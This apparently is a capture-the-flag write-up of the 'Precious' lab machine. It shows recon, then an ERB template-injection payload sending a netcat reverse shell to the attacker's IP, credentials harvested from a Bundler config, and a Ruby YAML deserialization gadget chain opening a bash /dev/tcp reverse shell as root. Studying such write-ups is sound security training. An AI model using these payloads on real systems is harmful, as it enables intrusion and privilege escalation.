#+TITLE:Precious write up
#+AUTHOR: Wordir
#+DATE:25/03/2024

* Enumeration


as always the first step is to ping the target's IP address to actually verify that it is reachable.
so we are going to use nmap to ping it.

#+begin_bash bash
nmap -sn 10.10.11.189
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 16:52 EDT
Nmap scan report for 10.10.11.189
Host is up (0.051s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
#+end_bash


OK it would appear that the host is active, now it's time to run a scan with nmap to see which ports are open:

** namp scan 

#+begin_bash bash
sudo nmap -sC -sV -O 10.10.11.189                                                                                                 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 16:59 EDT
Nmap scan report for 10.10.11.189
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/25%OT=22%CT=1%CU=42110%PV=Y%DS=2%DC=I%G=Y%TM=6601
OS:E5B2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds                                                              
#+end_bash

** Adding to /etc/hosts

as you can see we have port 22(ssh) and port 80(http) open,
since to log in with *ssh* we need a username and password,for the moment we will take a look at the website.

inserting the IP address into our browser a domain is returned, which however the public DNS is unable to resolve, it will therefore be
you need to add the IP address and domain name to *"etc/hosts"*



#+begin_bash bash
sudo vim /etc/hosts

and paste this:

10.10.11.189    precious.htb
#+end_bash

this is what is returned to us:

[[./img/precious.png][img]]

** Feroxbuster

now it's time to enumerate the web server paths, to do this, we are goin to use a tool named *feroxbuster*


#+begin_bash bash
feroxbuster -u http://precious.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://precious.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       18c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l       89w      815c http://precious.htb/stylesheets/style.css
200      GET       18l       42w      483c http://precious.htb/
[####################] - 88s    81631/81631   0s      found:2       errors:0      
[####################] - 88s    81629/81629   930/s   http://precious.htb/ 
#+end_bash


well as we can see , no we didn't get much, so now it's time to find out the technologies behind
the website and analyze the requests with burpsuite


** Whatweb

#+begin_bash bash 
whatweb http://precious.htb/   
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15],
IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF],
UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15],
X-XSS-Protection[1; mode=block], nginx[1.18.0]
#+end_bash


now it's time to do some research:


** Phusion Passenger:
Phusion Passenger® is a web server and application server, designed to be fast, robust and lightweight.
It takes a lot of complexity out of deploying web apps.
Supports Ruby, Python, Node.js ...


** Ruby on Rails:
Ruby on Rails (simplified as Rails) is a server-side web application framework written in Ruby under the MIT License.
Rails is a model–view–controller (MVC) framework.

Researching a bit about Rails we learn that it is often used with *ERB* (Embedded Ruby) 
a templating system that allows you to embed Ruby code directly into your text files, including *HTML*
*generating dynamic views*

*How does ERB work?*

ERB processes your text files and looks for special tags that contain Ruby code. These tags tell ERB where to execute Ruby code and insert the results into the final output.
There are two types of ERB tags:

*<% Ruby code %>* : This tag is used to execute Ruby code without producing any output. For example, you can use it for looping, conditionals, or variable assignments.

*<%= Ruby code %>* : This tag is used to execute Ruby code and produce output that will be included in the final document. For example, you can use it to insert the value of a variable or the result of a method call.

so now it's time to open burpsuite and do some tests

** Burpsuite

* Exploit

#+begin_bash
POST / HTTP/1.1
Host: precious.htb
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://precious.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://precious.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

*url=http%3a//sda%250a<%25%3d+system("whoami")+%25>*

#+end_bash

well looking at the response it seems that the website ignores our malicious payload and correctly generates the pdf,
(the website in question converts some html text to a pdf)
however we do not receive the output of our command, let's try a reverse shell.

** Reverse shell:

payload : *url=http%3a//sda%250a<%25%3d+system("busybox nc 10.10.14..9 4444 -e sh")+%25>*

results:
#+begin_bash bash
nc -lvnp 4444                
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.189] 46244
ls
app
config
config.ru
Gemfile
Gemfile.lock
pdf
public
#+end_bash

it worked !!!

now it's time to consolidate the rev with pawncat and after that is time to enumarate the system.


#+begin_bash bash

ruby@precious:/var/www/pdfapp$ whoami
ruby
#+end_bash

we are ruby, on the machine the are two more users, root and henry,
enumerating the system we found nothing that could be an attack vector except some files that we could not execute or modify.
so now since we have port 22 open we'll try to find henry's credentials around the system.

we find an Insecure Gem Configuration: The .bundle/config file is used by Bundler, a Ruby gem manager.
Bundler can cache gem credentials, including API keys or access tokens, in this file.
This is generally not recommended for production environments as it exposes sensitive information.

in fact we find Henry credentials:

#+begin_bash bash
(remote) ruby@precious:/home/ruby/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
#+end_bash

** SSH login

let's try to login with SSH, logged succesfully, let's get the *user flag*

#+begin_bash bash 
cat user.txt 
4e48f9563d480c07a9b18816b9200550
#+end_bash

time to lists sudo permission with *sudo -l*


#+begin_bash bash
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

#+end_bash

so now let's take a look at the script in question:

#+begin_ruby ruby

# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end


#+end_ruby


as we can se the script try to read a file *dependencies.yaml* which is passed with a relative path, so when the script is executed it will search the current directory ,
also we can see that the .yaml file is read with the following function *YAML.load(File.read(file.yaml))* , it's time to serch if the function is someway vulnerable


and yes, we found it:

* Escalation

*Ruby – Insecure Deserialization – YAML (Privilege Escalation)*

Deserialization is the process of transforming serialized data, such as YAML or JSON, back into its original form. Insecure deserialization occurs when untrusted data is deserialized without proper validation, leading to potential security risks. Attackers can exploit this vulnerability to execute arbitrary code, bypass authentication,
or perform other malicious activities.

now to perform the correct exploit we need to see the ruby version.


#+begin_bash bash 
henry@precious:~$ ruby -v
ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
#+end_bash


here the exploit code:

#+begin_ruby ruby

- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1'"
         method_id: :resolve

#+end_ruby


now launch *henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb* and we get a rev shell as root

#+begin_bash bash 

(remote) root@precious:/root#  whoami ; cd /root ; cat root.txt
root
892ffc8761ddcbb73b41b471ca97765d

#+end_bash
